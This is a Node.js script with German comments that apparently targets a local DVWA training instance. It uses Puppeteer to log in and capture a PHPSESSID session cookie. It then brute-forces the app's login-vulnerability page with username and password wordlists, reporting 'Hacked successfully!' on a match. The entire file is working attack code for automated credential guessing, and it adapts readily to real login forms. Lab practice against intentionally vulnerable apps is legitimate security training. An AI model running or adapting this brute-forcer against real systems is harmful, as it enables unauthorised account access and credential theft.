const fs = require("node:fs/promises");
const puppeteer = require("puppeteer");
const ipaddress = "10.115.2.9";

async function getPHPSESSID() {
  // Browser öffnen
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // DVWA öffnen
  await page.goto("http://10.115.2.9:4280/");

  // Screen size
  await page.setViewport({ width: 1080, height: 1024 });

  // Brute-Force Login durchführen, um die Session zu erhalten
  const usernames = ["admin", "ali"]; // Zum Beispiel: Versuche den Standard-Username
  const passwords = ["password", "1234"]; // Hier Beispiel-Passwörter (ersetze dies mit deiner Liste)

  let PHPSESSID = null;

  for (const username of usernames) {
    for (const password of passwords) {
      // Login durchführen
      await page.type("#username", username);  // Das ID des Benutzernamefelds
      await page.type("#password", password);  // Das ID des Passwortfelds
      await page.click("#login_button");  // Das ID des Login-Buttons
      await page.waitForNavigation();  // Warten bis die Seite geladen ist

      const text = await page.content();
      if (text.includes("Login Failed")) {
        console.log(`Login Failed for Username: ${username}, Password: ${password}`);
      } else {
        console.log(`Login Successful for Username: ${username}, Password: ${password}`);
        // Cookies holen
        const cookies = await page.cookies();
        PHPSESSID = cookies.find((cookie) => cookie.name === "PHPSESSID")?.value;
        break;
      }
      await page.goto("http://10.115.2.9:4280/");  // Zurück zur Login-Seite
    }
    if (PHPSESSID) break;
  }

  await browser.close();
  return PHPSESSID;
}

const main = async () => {
  try {
    // Wordlists laden
    const userData = await fs.readFile("usernames.txt", "utf8");
    const passData = await fs.readFile("password.txt", "utf8");

    // Usernames und Passwörter in Arrays umwandeln
    const usernames = userData
      .trim()
      .split("\n")
      .map((line) => line.trim());
    const passwords = passData
      .trim()
      .split("\n")
      .map((line) => line.trim());

    // PHPSESSID holen
    const PHPSESSID = await getPHPSESSID();
    if (!PHPSESSID) {
      console.error("PHPSESSID konnte nicht abgerufen werden.");
      return;
    }

    // Brute-Force
    for (const username of usernames) {
      for (const password of passwords) {
        const response = await fetch(
          `http://${ipaddress}:4280/vulnerabilities/brute/?username=${username}&password=${password}&Login=Login#`,
          {
            method: "GET",
            headers: {
              Cookie: `PHPSESSID=${PHPSESSID}; security=low`,
            },
          }
        );
        const text = await response.text();
        if (text.includes("incorrect")) {
          console.log(
            `Username: ${username}, Password: ${password} is incorrect`
          );
        } else {
          console.log("Hacked successfully!");
          console.log(`Username: ${username}, Password: ${password}`);
          process.exit();
        }
      }
    }
  } catch (error) {
    console.error("Error in main:", error);
  }
};

main();
